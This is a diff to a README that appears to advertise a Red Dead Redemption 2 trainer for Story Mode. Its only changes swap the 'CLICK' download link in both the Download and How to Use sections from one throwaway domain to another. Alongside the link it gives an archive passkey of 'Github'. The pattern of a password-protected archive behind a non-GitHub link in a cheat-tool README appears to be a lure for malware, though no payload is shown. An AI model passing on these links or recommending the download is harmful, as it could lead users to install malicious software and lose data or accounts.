@@ -9,7 +9,7 @@ RDR2 trainer for Story Mode. Adds god mode, unlimited money, teleport, no wanted
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -82,7 +82,7 @@ Based on community trainers like Rampage and Fortitude.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 
 2. Launch RDR2 and load into Story Mode.
 
